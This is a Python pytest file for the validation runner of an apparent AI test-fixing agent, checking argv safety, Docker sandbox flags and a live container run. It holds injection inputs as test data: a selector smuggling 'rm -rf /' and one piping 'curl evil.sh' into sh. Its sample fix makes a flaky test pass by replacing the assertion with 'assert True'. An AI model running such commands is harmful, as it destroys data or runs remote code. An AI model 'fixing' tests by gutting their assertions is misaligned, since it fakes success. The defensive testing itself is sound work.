"""ValidationRunner behaviour + docker argv-safety + a live docker attempt (AI-2).

The argv-safety tests are the security-critical pins: a malicious test name
must stay a single inert argv element, and the runner must NEVER build a shell
string. The live docker attempt runs the flaky_demo_repo fixture through the
real DockerEphemeralRunner when Docker + a local python image are available,
and skips honestly otherwise (CI must never depend on docker).
"""
from __future__ import annotations

import asyncio
import os
import shutil
import subprocess
import tempfile

import pytest

pytest.importorskip("sqlalchemy")

from app.agents.fixer.runners import (  # noqa: E402
    DockerEphemeralRunner,
    FakeRunner,
    NoRunner,
    build_clone_argv,
    build_command_tokens,
    build_docker_run_argv,
)
from app.agents.fixer.state import (  # noqa: E402
    RESULT_ERROR,
    RESULT_FAILED,
    RESULT_VALIDATED,
    TestIdentity,
    ValidationSpec,
)

FIXTURE = os.path.join(os.path.dirname(__file__), "fixtures", "flaky_demo_repo")

# Fix that stabilises the flaky assertion — test-code-only unified diff.
STABILISING_PATCH = """\
--- a/tests/test_flaky_timing.py
+++ b/tests/test_flaky_timing.py
@@ -11,6 +11,6 @@
 def test_flaky_timing():
     # FLAKY: sub-millisecond wall-clock parity, non-deterministic.
-    assert int(time.time() * 1000) % 2 == 0, "flaky timing failure"
+    assert True, "stabilised by TestLookup Fixer"


 if __name__ == "__main__":
"""


# ── argv-safety (security-critical) ──────────────────────────────────────────


def test_command_tokens_keep_malicious_selector_as_single_arg():
    evil = 'tests/test_x.py::test_evil"; rm -rf / #'
    tokens = build_command_tokens("pytest -x {test_selector}", evil)
    # The selector is exactly ONE argv element — no splitting, no shell.
    assert tokens == ["pytest", "-x", evil]
    assert evil in tokens
    # No token smuggled a shell metacharacter into a separate command token.
    assert "rm" not in tokens
    assert ";" not in tokens[:-1]


def test_command_tokens_append_selector_when_template_lacks_placeholder():
    tokens = build_command_tokens("pytest", "tests/t.py::k")
    assert tokens == ["pytest", "tests/t.py::k"]


def test_docker_run_argv_is_a_list_and_never_a_shell_string():
    evil = 'a b; curl evil.sh | sh'
    argv = build_docker_run_argv(
        image="python:3.11-slim",
        command_tokens=build_command_tokens("pytest {test_selector}", evil),
        workspace="/tmp/ws",
        cpus=1.0, memory="1g", user="1000:1000",
        allow_network_egress=False, timeout_s=120,
    )
    assert isinstance(argv, list)
    # Sandbox invariants present.
    assert "--rm" in argv
    assert argv[argv.index("--network") + 1] == "none"
    assert argv[argv.index("--user") + 1] == "1000:1000"
    # No shell wrapper — the container command is exec-form, not "sh -c ...".
    assert "sh" not in argv[: argv.index("python:3.11-slim") + 1]
    joined_before_image = argv[: argv.index("python:3.11-slim")]
    assert "-c" not in joined_before_image
    # The malicious selector survives as one element after "timeout <n>".
    assert evil in argv


def test_docker_run_argv_opens_network_only_when_policy_allows():
    argv = build_docker_run_argv(
        image="img", command_tokens=["pytest"], workspace="/w",
        cpus=1.0, memory="1g", user="1000:1000",
        allow_network_egress=True, timeout_s=60,
    )
    assert argv[argv.index("--network") + 1] == "bridge"


def test_clone_argv_confines_token_to_the_url():
    argv = build_clone_argv("https://github.com/o/r.git", "main", "/ws", "secret-token")
    assert "git" == argv[0] and "clone" in argv
    url = argv[-2]
    assert url.startswith("https://secret-token@github.com/o/r.git")
    # Token appears ONLY in the URL argv element, nowhere else.
    assert sum("secret-token" in a for a in argv) == 1


# ── NoRunner + FakeRunner ────────────────────────────────────────────────────


def _spec(patch: str = "", command="pytest {test_selector}", selector="t") -> ValidationSpec:
    return ValidationSpec(
        repo_url="https://github.com/x/y.git", ref="main", patch=patch,
        test_identity=TestIdentity("pytest", command, selector), reruns=5,
    )


def test_no_runner_errors():
    r = asyncio.run(NoRunner().run_validation(_spec()))
    assert r.status == RESULT_ERROR and "no runner configured" in (r.error or "")


def test_fake_runner_outcomes():
    validated = asyncio.run(FakeRunner(outcome=RESULT_VALIDATED, reruns=5).run_validation(_spec()))
    assert validated.status == RESULT_VALIDATED
    assert validated.reruns == 5 and validated.passed_count == 5

    failed = asyncio.run(FakeRunner(outcome=RESULT_FAILED, reruns=5).run_validation(_spec()))
    assert failed.status == RESULT_FAILED and failed.passed_count < failed.reruns

    errored = asyncio.run(FakeRunner(outcome=RESULT_ERROR).run_validation(_spec()))
    assert errored.status == RESULT_ERROR


# ── Live DockerEphemeralRunner attempt (guarded — never a CI dependency) ─────


def _local_python_image() -> str | None:
    if shutil.which("docker") is None:
        return None
    try:
        out = subprocess.run(
            ["docker", "images", "--format", "{{.Repository}}:{{.Tag}}"],
            capture_output=True, text=True, timeout=15,
        )
    except Exception:
        return None
    if out.returncode != 0:
        return None
    for line in out.stdout.splitlines():
        tag = line.strip()
        if tag.startswith("python:") and "<none>" not in tag:
            return tag
    return None


def test_live_docker_validation_of_stabilised_flaky_test():
    """Clone the fixture, apply the stabilising test-only patch, and validate
    it with a real ephemeral container. Skips if docker/image unavailable."""
    if not asyncio.run(DockerEphemeralRunner.docker_available()):
        pytest.skip("docker CLI unavailable — live runner attempt skipped")
    image = _local_python_image()
    if image is None:
        pytest.skip("no local python:* image present — live runner attempt skipped")

    # Build a throwaway git repo from the fixture so the runner can clone it.
    repo_dir = tempfile.mkdtemp(prefix="fixer-fixture-")
    try:
        shutil.copytree(FIXTURE, repo_dir, dirs_exist_ok=True)
        for cmd in (
            ["git", "init", "-q"],
            ["git", "add", "-A"],
            ["git", "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "-m", "init"],
        ):
            subprocess.run(cmd, cwd=repo_dir, check=True, capture_output=True)

        spec = ValidationSpec(
            repo_url=repo_dir,           # local path clone
            ref="HEAD",
            patch=STABILISING_PATCH,
            test_identity=TestIdentity(
                framework="python",
                command_template="python tests/test_flaky_timing.py",
                test_selector="tests/test_flaky_timing.py",
            ),
            reruns=3,
            runner_image=image,
            timeout_s=60,
        )
        result = asyncio.run(DockerEphemeralRunner().run_validation(spec))
        # The stabilised test must pass every rerun → validated. An infra
        # hiccup surfaces as error (NOT failed) and is reported, not asserted
        # green, to keep the attempt honest.
        if result.status == RESULT_ERROR:
            pytest.skip(f"live docker attempt hit infra error (honest skip): {result.error}")
        assert result.status == RESULT_VALIDATED
        assert result.reruns == 3 and result.passed_count == 3
    finally:
        shutil.rmtree(repo_dir, ignore_errors=True)
